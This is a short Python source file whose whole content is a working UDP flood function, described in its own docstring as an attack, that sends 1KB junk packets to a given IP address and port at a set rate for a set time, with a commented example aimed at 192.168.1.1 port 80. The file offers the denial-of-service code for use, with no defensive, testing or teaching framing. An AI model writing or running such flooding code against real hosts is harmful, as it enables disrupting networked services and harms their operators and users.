import socket
import time

def UDPFlood(target_ip, target_port, duration, packet_rate):
    """
    Perform a UDP flood attack on the specified target.

    :param target_ip: IP address of the target.
    :param target_port: Port number of the target.
    :param duration: Duration of the attack in seconds.
    :param packet_rate: Number of packets to send per second.
    """
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Calculate the interval between sending packets
    interval = 1.0 / packet_rate

    # Record the start time
    start_time = time.time()

    while (time.time() - start_time) < duration:
        # Create a dummy packet
        try:
            message = b'A' * 1024  # 1KB payload
            sock.sendto(message, (target_ip, target_port))
        except Exception as e:
            print(f"Failed to send packet: {e}")
            break

        # Control the packet rate
        time.sleep(interval)

    # Close the socket
    sock.close()
    print("Attack completed.")

# Example usage:
# UDPFlood('192.168.1.1', 80, 10, 100)